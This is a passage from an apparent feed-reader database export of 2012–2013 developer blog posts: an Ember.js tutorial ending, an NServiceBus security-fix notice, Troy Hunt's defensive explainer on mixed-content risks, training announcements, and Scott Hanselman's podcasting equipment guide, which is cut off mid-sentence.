class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"c1\">//our app</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">HelloEmber</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">({});</span></span><span class='line'></span><span class='line'><span class=\"c1\">//our model</span></span><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">Greeting</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nb\">Object</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">greeting</span><span class=\"o\">:</span><span class=\"s2\">\"Good Morning Starshine!\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">happyThought</span><span class=\"o\">:</span><span class=\"s2\">\"The Earth Says Hello!\"</span></span><span class='line'><span class=\"p\">});</span></span><span class='line'></span><span class='line'><span class=\"c1\">//our route</span></span><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">IndexRoute</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Route</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">model</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(){</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">Greeting</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>This is all the code you should have in app.js. Notice how we have no Controller? We don't need one. This is confusing, but let's make sure things are working - refresh your page and you should see everything working just fine.</p><p>Assuming that it is - what we have here is naming magic at work, again. We've always had an IndexRoute (Ember created it for us since we didn't explicitly declare one) - but this time we wanted to specify a model so we needed to use a Route.</p><p>I mentioned that the Route exists to marry up a Controller to a Model,<strong>but we have no Controller!</strong>This can be maddening: we<em>do have a Controller</em>, we just didn't have to write the code for it: Ember did that for us.</p><p>The Controller that Ember created (the IndexController) was associated to our Route because we kept with the Ember naming magic. That Controller took the model that was available on the Route and\"grafted it\" onto itself, making the data on the model available to our view.</p><h2>Good Job!</h2><p>If you've made it this far, you now know as much as I do. There's a lot happening in the background with Ember; the goal being that the Ember team wants to reduce the tedious\"boilerplate\" code you write with other frameworks, like Backbone.</p><p>This can be a neat thing, it can also be highly confusing if you don't know what's going on.</p><p>I encourage you to play around with Ember and Handlebars now that you have your footing. It's an interesting thought experiment that works well for many developers.</p><p><strong>Note:</strong><em>I'm not an Ember expert by any stretch so if you've found any misstatements or silliness here, please do let me know and I'll adjust.</em></p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yMrhlO3kWpI:JEq8vZS8rjk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yMrhlO3kWpI:JEq8vZS8rjk:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=yMrhlO3kWpI:JEq8vZS8rjk:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yMrhlO3kWpI:JEq8vZS8rjk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=yMrhlO3kWpI:JEq8vZS8rjk:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yMrhlO3kWpI:JEq8vZS8rjk:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=yMrhlO3kWpI:JEq8vZS8rjk:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/yMrhlO3kWpI\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1152}}
{"k":"0000000084","o":"0000001734","v":"001"}
{"_id":1153,"_uid":1153,"_dt":1373742620945,"_s":"cee3ae4bc13ff775dae9806099324998"}
{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/K2jccZ_0_44/","title":"NServiceBus Security Issue Fixed","published":{"$wrap":"$date","v":1346261585000,"h":"2012-08-29T17:33:05.000Z"},"starred":false,"read":false,"content":"<p>Just wanted to follow up to say that the issue has been fixed in version 3.2.8 of NServiceBus. You can download this via our website or through NuGet. Despite our best efforts, we weren’t able to fix the issue in such a way that you’d be able to do a zero-downtime upgrade in all cases (like in every NServiceBus upgrade so far), but we think that you wouldn’t incur more than 5 to 10 minutes of downtime on this.</p><p><a href=\"http://tech.groups.yahoo.com/group/nservicebus/message/15582\">Full information here.</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=K2jccZ_0_44:BdrwWQpfphs:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=K2jccZ_0_44:BdrwWQpfphs:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=K2jccZ_0_44:BdrwWQpfphs:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=K2jccZ_0_44:BdrwWQpfphs:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=K2jccZ_0_44:BdrwWQpfphs:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/K2jccZ_0_44\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1153}}
{"k":"0000000084","o":"0000005610","v":"001"}
{"_id":1154,"_uid":1154,"_dt":1373742620945,"_s":"92ff821b8ce564372258d9ef23ad334c"}
{"subscription":{"$wrap":"$oid","v":44},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/pczeDYOJ1KU/understanding-risk-of-mixed-content.html","title":"Understanding the risk of mixed content warnings","published":{"$wrap":"$date","v":1370897100001,"h":"2013-06-10T20:45:00.001Z"},"starred":false,"read":false,"content":"<p>Ever see one of these?</p><p><img width=\"456\" height=\"169\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"IE8 mixed content warning\" src=\"http://lh4.ggpht.com/-HNEehdDcnn4/UbY66rVDvoI/AAAAAAAAFZw/Iy-mb291COA/image%25255B2%25255D.png?imgmax=800\" border=\"0\"></p><p>Or these?</p><p><img width=\"668\" height=\"50\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"IE10 mixed content warning\" src=\"http://lh3.ggpht.com/-JU0V1DWCr68/UbY67ArIaFI/AAAAAAAAFZ4/fRlB9-lZoEM/image%25255B5%25255D.png?imgmax=800\" border=\"0\"></p><p>Or maybe this one?</p><p><img width=\"270\" height=\"106\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Chrome mixed content warning\" src=\"http://lh4.ggpht.com/-MVQqXSXTAR0/UbY67V140RI/AAAAAAAAFaA/wlRpn5YDjwc/image%25255B8%25255D.png?imgmax=800\" border=\"0\"></p><p>It means something is wrong with the website –<em>very wrong</em>– yet somehow we seem to keep building websites that do this. The problem, as you’ll see in the video below, is that it jeopardises the security of traffic going backwards and forwards over what otherwise appears to be a secure site, at least in terms of implementing SSL. This can lead to issues such as the theft of identity data, potentially including such personal information as social security numbers. Fortunately there’s a channel to report potentially fraudulent activity except that, well, this video explains it best:</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/CSmacMZ0xZo?feature=player_embedded\" frameborder=\"0\" allowfullscreen></iframe><a name='more'></a><p>Of course it’s ironic that it’s the Social Security Administration that’s made a bit of a botch of this but it’s an all too familiar scenario.<a href=\"http://www.troyhunt.com/2012/07/lessons-in-website-security-anti.html\">Tesco did it</a>,<a href=\"http://www.troyhunt.com/2013/05/why-i-am-worlds-greatest-lover-and.html\">so did Versa Lift</a>,<a href=\"http://www.troyhunt.com/2013/04/5-ways-to-implement-https-in.html\">so did Top CashBack</a>and a heap of others I haven’t previously written about. It’s rampant.</p><p>That’s the risk covered, let’s focus on the fixes and they’re all dead easy:</p><ol><li>Embed external content explicitly via the HTTPS scheme. If you’re only serving the page over HTTPS anyway then it ensures no slip ups.</li><li>Use a protocol relative URL or in other words, embed resources such as the jQuery file in the example above as //ajax.googleapis.com/… Yes, I know it looks weird but it works and it means when the page is loaded over HTTP then the resource will be requested over HTTP. Load the page over HTTPS and the resource embeds over HTTPS.</li><li>Test your damn web pages! No seriously, this is a fundamentally basic flaw and as soon as you load the page most browsers will start complaining. Have we – even us developers – become so desensitised to security warnings that we totally ignore them?!</li></ol><p>For the curious, as I mention in the video this demonstration was achieved by mounting a man in the middle attack at the proxy level. I used<a href=\"http://fiddler2.com/\">Fiddler</a>as the proxy and<a href=\"http://fiddler2.com/documentation/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse\">Fiddler Script</a>to modify the jQuery file in the OnBeforeResponse event. Whilst all this occurred within my PC, it demonstrates the alibility for it to happen at a proxy server anywhere – or at the internet gateway of your local cafe, or elsewhere in the ISP, or via a<a href=\"http://www.enigmacurry.com/category/diy/\">wiretap</a>on an enthernet cable or<a href=\"http://www.troyhunt.com/2013/04/the-beginners-guide-to-breaking-website.html\">as I’ve shown recently with the Pineapple</a>, via a rogue wireless access point the victim is connected to, possibly even without their knowledge.</p><p>Now as with my previous video on<a href=\"http://www.troyhunt.com/2013/05/your-login-form-posts-to-https-but-you.html\">the risk of loading login forms over HTTP</a>, many people will ask “Is this really a likely risk?” In fact that’s just<a href=\"https://twitter.com/paulswail/status/342836543855144960\">the discussion I had with Rob Conery</a>after the aforementioned post as even<a href=\"http://tekpub.com/\">TekPub</a>follows this pattern. I look at it like this: you implement SSL primarily because you’re concerned about the risk of someone intercepting your traffic. Assuming you acknowledge – and attempt to protect against – this risk, you accept that all the HTTP components of the communication remain vulnerable ergo you need to protect against the SSL anti-patterns mentioned here.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/pczeDYOJ1KU\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1154}}
{"k":"0000000084","o":"0000004143","v":"001"}
{"_id":1155,"_uid":1155,"_dt":1373742620945,"_s":"e595b5bfbfccf6edbf76e11f757848d5"}
{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/ceGm62cxjmA/","title":"Last round of training","published":{"$wrap":"$date","v":1361617218000,"h":"2013-02-23T11:00:18.000Z"},"starred":false,"read":false,"content":"<p>If you’d asked me last year how long I saw myself jetting around the world giving my SOA course, I probably would have said that I could see myself doing this well into “retirement”. But things change – usually when you least expect it.</p><p>In any case, I’ll be giving the course 4 more times, and that’ll be it.</p><table cellpadding=\"0\" cellspacing=\"0\" border=\"1\" width=\"100%\"><tr style=\"font-weight:bold; text-align:center; \"><td>Date</td><td>City</td><td>Address</td><td>Register</td></tr><tr style=\"text-align:center;\"><td>Mar 18</td><td>Oslo, NO</td><td><a style=\"font-weight: normal;\" href=\"https://maps.google.com/maps?q=Martin+Lingesvei+17+%E2%80%93+25+oslo+norway&hl=en&ie=UTF8&sll=38.997934,-105.550567&sspn=6.10311,10.953369&t=h&hnear=Martin+Linges+Vei+17,+%C3%98stensj%C3%B8,+0692+Oslo,+Norway&z=16&iwloc=A\">Program Utvikling</a><br/>Martin Lingesvei 17 – 25</td><td><a style=\"font-weight:normal;\" href=\"http://www.programutvikling.no/kurskalenderoversikt.aspx?id=1042071\">Register</a></td></tr><tr style=\"text-align:center;\"><td>Apr 8</td><td>New York, US</td><td><a style=\"font-weight: normal;\" href=\"http://maps.google.com/maps?q=290+Madison+Ave%2BNew+York%2B%2BUSA\">New Horizons</a><br/>290 Madison Ave</td><td><a style=\"font-weight:normal;\" href=\"http://nservicebus.eventbee.com/event?eid=900376302\">Register</a></td></tr><tr style=\"text-align:center;\"><td>May 13</td><td>Stockholm, Sweden</td><td><a style=\"font-weight: normal;\" href=https://maps.google.com/maps?q=Sv%C3%A4rdv%C3%A4gen+3A,+182+11+Danderyd+sweden&hl=en&ie=UTF8&sll=37.0625,-95.677068&sspn=60.806372,108.720703&t=h&hnear=Sv%C3%A4rdv%C3%A4gen+3A,+182+33+Danderyd,+Sweden&z=16\">Cornerstone</a><br/>Svärdvägen 3A, 182 11 Danderyd </td><td><a style=\"font-weight:normal;\" href=\"http://www.cornerstone.se/Web/Templates/CoursePage.aspx?id=2513&course=COUR2011030713242304266086&epslanguage=SV\">Register</a></td></tr><tr style=\"text-align:center;\"><td>June 3</td><td>London UK</td><td><a style=\"font-weight: normal;\" href=\"http://skillsmatter.com/location-details/open-source-dot-net/2595/196\">Skills Matter</a><br/>107-111 Fleet Street</td><td><a style=\"font-weight:normal;\" href=\"https://skillsmatter.com/register-online/course/2595\">Register</a></td></tr></table><p>When I was in Denver last month, I had the SOA course professionally recorded so if you can’t make any of these dates, you’ll still be able to get the videos. If you bought the videos in the past, don’t worry, I’ll be getting you the new videos as soon as they’re available. The NServiceBus courses delivered by other trainers will continue to run the same as before.</p><p>This change is part of a larger change in priorities for me. There are some big things coming that I’m very excited about that require quite a bit more of my attention.</p><p>Anyway, hope to see you either in Oslo, New York, Stockholm, or London.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=ceGm62cxjmA:QZg3Ewnx_mI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=ceGm62cxjmA:QZg3Ewnx_mI:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=ceGm62cxjmA:QZg3Ewnx_mI:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=ceGm62cxjmA:QZg3Ewnx_mI:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=ceGm62cxjmA:QZg3Ewnx_mI:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/ceGm62cxjmA\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1155}}
{"k":"0000000084","o":"0000002113","v":"001"}
{"_id":1156,"_uid":1156,"_dt":1373742620945,"_s":"937809ea4478c9b1357d0561c43d09fc"}
{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/xwmcEcd8biw/","title":"Recording of my June 2013 Q&A at Skills Matter online","published":{"$wrap":"$date","v":1371120411000,"h":"2013-06-13T10:46:51.000Z"},"starred":false,"read":false,"content":"<p>When I was in London last week teaching my 5-day course I gave an open Q&A on one of the evenings. The recording of that talk is now online <a href=\"http://skillsmatter.com/podcast/open-source-dot-net/june-qa\">here</a>.</p><p>It was interesting to see that while many people came to the Q&A, there weren’t a whole lot with questions.</p><p>In any case, I was wondering if online the situation would be much different.</p><p>Some time ago I had a monthly podcast called “Ask Udi” and I was thinking of reviving that.</p><p>What do you think? Is that something you’d like? Leave me a comment.</p><p>And if you missed the course in London, I’m giving just one more course this year – here in Israel from June 30 – July 4. For details and registration, check out the <a href=\"http://sela.co.il/syl/syllabus.aspx?CourseCode=AdvDistDahan&CategoryID=165\">Sela website</a>.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=xwmcEcd8biw:MKalbrOT1fw:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=xwmcEcd8biw:MKalbrOT1fw:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=xwmcEcd8biw:MKalbrOT1fw:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=xwmcEcd8biw:MKalbrOT1fw:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=xwmcEcd8biw:MKalbrOT1fw:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/xwmcEcd8biw\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1156}}
{"k":"0000000084","o":"0000000754","v":"001"}
{"_id":1157,"_uid":1157,"_dt":1373742620946,"_s":"54c860552bf2f8ca5a3fd7680b4990bb"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://www.thoughtworks-studios.com/sites/default/files/resource/twebook-perspectives-estimation_1.pdf","title":"How do you estimate on an Agile project?","published":{"$wrap":"$date","v":1367602560000,"h":"2013-05-03T17:36:00.000Z"},"starred":false,"read":false,"content":"<p>If you’re interested in techniques for estimation, you should take a look at this pdf ebook. It contains half-a-dozen essays on estimating in agile projects, drawn from our experiences with a wide range of clients. We explain approaches based on story points and on story counting, which should give you a good overview for you to explore an approach that will work for you.</p>","author":false,"_id":{"$wrap":"$oid","v":1157}}
{"k":"0000000084","o":"0000018312","v":"001"}
{"_id":1158,"_uid":1158,"_dt":1373742620946,"_s":"4aac0eb395fd61b8140c92db1e080c21"}
{"subscription":{"$wrap":"$oid","v":39},"link":"http://feeds.hanselman.com/~/42683094/0/scotthanselman~How-to-start-your-first-podcast-equipment-editing-publishing-and-more.aspx","title":"How to start your first podcast - equipment, editing, publishing and more","published":{"$wrap":"$date","v":1372129983000,"h":"2013-06-25T03:13:03.000Z"},"starred":false,"read":false,"content":"<div><figure><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.ratchetandthegeek.com/\"><img title=\"Luvvie and Scott at BWBNYC\"style=\"display: inline\"alt=\"Luvvie and Scott at BWBNYC\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/ScottAndLuvvie_1.jpg\"width=\"999\"height=\"563\"/></a></figure><p>My friend<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.awesomelyluvvie.com\">Luvvie</a>and I were speaking at<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.bloggingwhilebrown.com\">Blogging While Brown</a>this last weekend in New York City, amongst other things and events. Luvvie and I host a podcast called<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.ratchetandthegeek.com\">Ratchet and The Geek</a>. I produce<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselman.com/podcasts/\">three podcasts</a>-<strong>Hanselminutes</strong>,<strong>This Developer's Life</strong>, and<strong>Ratchet and The Geek</strong>. I do all of these on the side, for fun.</p><blockquote><p><strong>Context in NPR terms</strong>: If the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.Hanselminutes.com\">Hanselminutes</a>podcast is\"Fresh Air for Developers\", then<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.ratchetandthegeek.com\">Ratchet and The Geek</a>is\"Car Talk for Techies,\" while<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.thisdeveloperslife.com\">This Developer's Life</a>is a loving homage to This American Life.</p></blockquote><p>At the conference, Luvvie and I hosted a one hour talk about\"<strong>Taking Your Blog to the Next Level with Podcasting</strong>.\" All the links to<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bitly.com/bwbpodcasting\">the equipment we recommend is at this Bit.ly Bundle</a>:<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bitly.com/bwbpodcasting\">bitly.com/bwbpodcasting</a></p><p>We did a<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.ratchetandthegeek.com/show/12.5-BWBNYC-Live\">5 minute\"mini-podcast\" live on stage</a>at the beginning of our talk, then talked about how we produce the show and how it goes from concept to topics to a produced and published MP3.</p><p>For this post I'm focusing on what you'll need for a podcast in terms of<strong>Equipment</strong>and<strong>Publishing</strong>. I'm assuming you're able to decide on your own topic/theme and spread the word about your new show.</p><h3><img title=\"BlogTalkRadio\"style=\"float: right; display: inline\"alt=\"BlogTalkRadio\"align=\"right\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_24.png\"width=\"350\"height=\"269\"/>Podcasting Equipment: Good, Better, Best</h3><p>Let's take a look at your options, ranked from Meh, through Good, Better, and Best.</p><h4></h4><h4>Meh</h4><p>You could use BlogTalkRadio as a super-quick way to jump-start your podcast, but there are some limitations. The benefits are that there's no software to use. It's basically a recorded conference call. They handle call-ins for guests, archiving, delivery and bandwidth. However, it goes up from Free to $39 a month or more quickly.</p><p>If you are serious about the future of your podcast I recommend that you put a little more work into and and you'll have lots more control and flexibility.</p><h4>Good</h4><p>If you are going to do Skype-based recordings or online interviews, get yourself a decent USB microphone/headset. These are NOT audiophile or good quality headphones - to be clear - but they are good enough for Skype and they are<strong>guaranteed</strong>to sound better than talking in to your laptop's tiny microphone hole.</p><p>Remember, your laptop may have cost $1000 but that tinny microphone hole was only $1 of the price. Have low expectations when using a laptop mic for a podcast.</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bit.ly/bwbpodcasting\"><img title=\"Logitech USB Headset\"style=\"display: inline\"alt=\"Logitech USB Headset\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_10.png\"width=\"450\"height=\"329\"/></a></p><p>If you get a microphone/headset, get one that's USB to keep the audio digital all the way into the laptop. Don't use 1/8\" analog headphone jacks for recording.</p><p>For Skype interviews I use<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.callburner.com\">CallBurner</a>to record the interviewee. Ideally your guest will also have a good USB microphone.<strong>Even better if your guest records a local file while you also record the Skype call</strong>. More on this technique further down in this post.</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.callburner.com\"><img title=\"CallBurner\"style=\"display: inline\"alt=\"CallBurner\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_461b66e6-5457-41cf-b66f-6ed8e73b152c.png\"width=\"531\"height=\"151\"/></a></p><h4>Better</h4><p>You may be able to get more flexibility if you move to a portable recorder. You can do interviews with these without carrying your laptop. You can also use your phone or tablet if you like. Ideally you'll want to make WAV files rather than MP3s. If you're editing your podcast later a WAV file will sound better while editing and won't lose quality. An MP3 is already compressed and then will get compressed again when you save your final podcast.</p><p>Consider a WAV file like a PNG, RAW file or BITMAP and an MP3 is like a JPEG. Edit in high quality files and export your final as a compressed MP3.S</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bitly.com/bwbpodcasting\"><img title=\"Sony Portable Recorder\"style=\"display: inline\"alt=\"Sony Portable Recorder\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_2641fdb8-8386-4bea-93d3-85ea453d50dc.png\"width=\"439\"height=\"329\"/></a></p><p>You can also add a small Lavalier (clip on) microphone if you like, then plug it into the portable recorder to better isolate sound for your interviews.</p><h4>Better++</h4><p>If you've got $80, consider a<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.amazon.com/gp/product/B000PTF0E2/ref=as_li_ss_tl?ie=UTF8&camp=1789&creative=390957&creativeASIN=B000PTF0E2&linkCode=as2&tag=diabeticbooks\">Samson C01UCW USB Mic or similar</a>. This is an extremely competent mic that plugs directly into your computer's USB port. You can record into<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~audacity.sourceforge.net/\">Audacity</a>or<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.adobe.com/products/audition.html\">Adobe Audition</a>or even iMovie or Garage Band directly. For one or two person talk shows this is a great mic to start with.</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.amazon.com/gp/product/B000PTF0E2/ref=as_li_ss_tl?ie=UTF8&camp=1789&creative=390957&creativeASIN=B000PTF0E2&linkCode=as2&tag=diabeticbooks\"><img title=\"Samson C01U\"style=\"display: inline\"alt=\"Samson C01U\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_248c5b8e-e4a9-4987-bdd8-d950f01bde3d.png\"width=\"438\"height=\"329\"/></a></p><p>Also consider your room configuration. If you have a square room with stone walls and wood floors, your listeners will be able to hear every bump in that echo-y environment. I use a<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.realtraps.com/p_pvb.htm\">Portable Vocal Booth from RealTraps</a>when sound quality really counts. This is useful for screencasts and voice-over work in a noisy environment.</p><h4>Best</h4><p>I say\"best\" but I'm assuming you don't have an actual recording studio available to you. This is the setup that I use on<strong>all my podcasts</strong>. I use a<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bit.ly/14PSZEO?r=bb\">Zoom H4N</a>portable recorder. It uses an SD card to store the WAV files. It comes with two small mics at the top for starters, but then lets you grow by adding either microphones with 1/4\" jacks or studio quality mics with XLR connectors.</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bitly.com/bwbpodcasting\"><img title=\"Zoom H4n\"style=\"display: inline\"alt=\"Zoom H4n\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_fac66c62-7360-47f6-babc-a095a09728d6.png\"width=\"444\"height=\"329\"/></a></p><p>I recommend<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.amazon.com/gp/product/B0000AQRSR/ref=as_li_ss_tl?ie=UTF8&camp=1789&creative=390957&creativeASIN=B0000AQRSR&linkCode=as2&tag=diabeticbooks\">Shure microphones</a>. Two<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.amazon.com/gp/product/B0000AQRSR/ref=as_li_ss_tl?ie=UTF8&camp=1789&creative=390957&creativeASIN=B0000AQRSR&linkCode=as2&tag=diabeticbooks\">Shure PG48-XLRs</a>with cables paired with the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bit.ly/14PSZEO?r=bb\">Zoom H4N</a><strong>will make great sounding podcasts</strong>. All the very best episodes of<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.thisdeveloperslife.com\">This Developer's Life</a>were recorded like this. All the episodes of Hanselminutes where the guest wasn't on Skype were recorded in person with this very setup.</p><p>The Zoom also has the benefit of improving your YouTube videos. You can mount it directly to a DSLR camera with video capabilities and greatly augment the resulting video's sound quality. Again, the components in a DSLR are optimized for visuals, not audio.</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bitly.com/bwbpodcasting\"><img title=\"Zoom H4n\"style=\"display: inline\"alt=\"Zoom H4n\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_22035b0d-c71c-42d7-87a5-3d9d4041c33d.png\"width=\"432\"height=\"329\"/></a></p><h3>Editing</h3><p>Luvvie and I live in different time zones so we record local files with our portable rigs PLUS we Skype each other and record the call with CallBurner. This gives me THREE files.</p><p><img title=\"Three files for one phone call\"style=\"display: inline\"alt=\"Three files for one phone call\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_bfa8eca5-ee7f-4c9f-9c50-df98544ebb75.png\"width=\"600\"height=\"350\"/></p><p>Why three files? Well, one high quality of my recorded locally as a WAV. One of my co-host recorded in high quality as a WAV and one of BOTH of us. The trick is that we<strong>don't use the phone/Skype track.</strong></p><p>The phone track is just for lining up the two other tracks. This makes it sound like my co-host and I are in the same room together. See the three files below. My co-host is on top - notice her track is quiet. I'm on the bottom. The phone track is in the middle. Since these are separate tracks I can adjust Luvvie's track to make it louder and better match my track's 